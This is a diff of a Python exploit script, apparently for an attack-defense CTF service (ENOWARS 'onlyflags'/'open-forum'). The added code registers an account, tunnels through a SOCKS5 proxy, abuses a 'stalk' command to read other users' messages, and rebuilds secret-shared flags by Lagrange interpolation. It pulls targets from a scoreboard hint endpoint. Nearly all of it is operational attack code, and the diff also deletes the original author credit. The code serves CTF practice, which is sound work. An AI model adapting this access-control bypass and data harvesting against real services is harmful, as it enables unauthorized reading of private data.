@@ -4,12 +4,12 @@
 exploit script used to stresstest the service by continually exploiting the service
 
 due to high cpu usage on the test vms, this script needs to be run locally.
-
-originally written by: Jacob Große
 """
 
 import json
 import requests
+import base64
+import sharing
 import sys
 import threading
 import traceback
@@ -19,13 +19,46 @@ import time
 from python_socks.async_.asyncio import Proxy
 import asyncio
 import httpx
+import re
 
-from typing import Optional
+from typing import Optional, Tuple, Union, List
 
 #asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
 
-TARGET = sys.argv[1] # The target's ip address is passed as an command line argument
-service = "premium-forum"
+TARGET2 = sys.argv[1] # The target's ip address is passed as an command line argument
+TARGET = "127.0.0.1"
+service = "open-forum"
+
+MSG_REGEX = re.compile(r"^(\d*)\(([a-zA-Z0-9-+=\/]*)\):(.*)$")
+ONE_FLAG_REGEX = re.compile(r"ONE\{([-A-Za-z0-9+/=]*)\}")
+P = 0x100000000000000000000000000000000000000000000000000000000000000000000007F
+
+
+
+def decode_or_mumble(byt: bytes, message: str = "not a utf-8 string") -> str:
+    try:
+        return byt.decode(encoding="utf-8")
+    except ValueError:
+        raise Exception(message)
+
+def decomp_msg(msg: str) -> Tuple[int, str, str]:
+    match = re.fullmatch(MSG_REGEX, msg)
+    if match is None:
+        raise Exception("message syntax broken")
+    id, username, content = match.groups()  # type: ignore
+    try:
+        id = int(id)
+    except ValueError:
+        raise Exception("message id is NaN")
+    return id, username, content
+
+
+def grep(needle: Union[re.Pattern, str], haystack: List[str]) -> List[str]:
+    res = []
+    for line in haystack:
+        if (needle in line):
+            res.append(line)
+    return res
 
 async def exp(thread_id):
     rq = httpx.AsyncClient(base_url=f"http://{TARGET}:9145")
@@ -35,11 +68,7 @@ async def exp(thread_id):
     password: str = "".join(
         random.choices(string.ascii_uppercase + string.digits, k=12)
     )
-    rq.post(
-        f"http://{TARGET}:9145/index.php",
-        json={"username":username, "password": password},
-        headers=[('Connection', 'close')]
-    )
+    await rq.post("/", data={"username":username, "password": password})
     proxy = Proxy.from_url(f"socks5://{username}:{password}@{TARGET}:1080", rdns=True)
     sock = await proxy.connect(service, 1337)
     rd, wr = await asyncio.open_connection(
@@ -48,30 +77,50 @@ async def exp(thread_id):
         sock=sock,
     )
     await rd.readuntil(b"\n>")
-    wr.write(f"join {thread_id}\n".encode())
+    wr.write(f"stalk {thread_id}\n".encode())
     await wr.drain()
     res = await rd.readuntil(b"\n>")
-    wr.write(f"show\n".encode())
-    await wr.drain()
-    data = await rd.readuntil(b"\n>")
+
+    res = decode_or_mumble(res).splitlines()
+
+    res = [decomp_msg(msg) for msg in grep(thread_id, res)]
+    if len(res) == 0:
+        raise Exception("no msg found")
+
+    xs = list(
+        map(
+            lambda x: (
+                x[0],
+                int.from_bytes(
+                    base64.b64decode(re.search(ONE_FLAG_REGEX, x[2]).group(1)),
+                    "big",
+                ),
+            ),
+            res,
+        )
+    )
+    test = sharing.lagrange2(xs, P)
+    flag = "ENO" + base64.b64encode(test.to_bytes(36, "big")).decode(
+        encoding="utf-8"
+    )
     #print(data.decode())
-    print(data)
+    print(flag)
 
 def exploit(hint: Optional[str], flag_store: Optional[int]):
     print(f'Attacking {TARGET} (flag_store={flag_store}, hint={hint})')
     store = int(flag_store)
-    if store == 0:
+    if store == 1 or store == 3:
         #print("one")
         asyncio.run(exp(hint))
-    # TODO implement exploit
 
 
 # Some CTFs publish information ('flag hints') which help you getting individual flags (e.g. the usernames of users that deposited flags).
 
 # Bambi CTF / ENOWARS flag hints:
 attack_info = requests.get('http://10.0.13.37:5001/scoreboard/attack.json').json()
+#attack_info = requests.get('http://192.168.1.0:5001/scoreboard/attack.json').json()
 service_info = attack_info['services']['onlyflags']
-team_info = service_info[TARGET] # Get the information for the current target
+team_info = service_info[TARGET2] # Get the information for the current target
 threads = []
 for round_nr in team_info:
     round_info = team_info[round_nr]
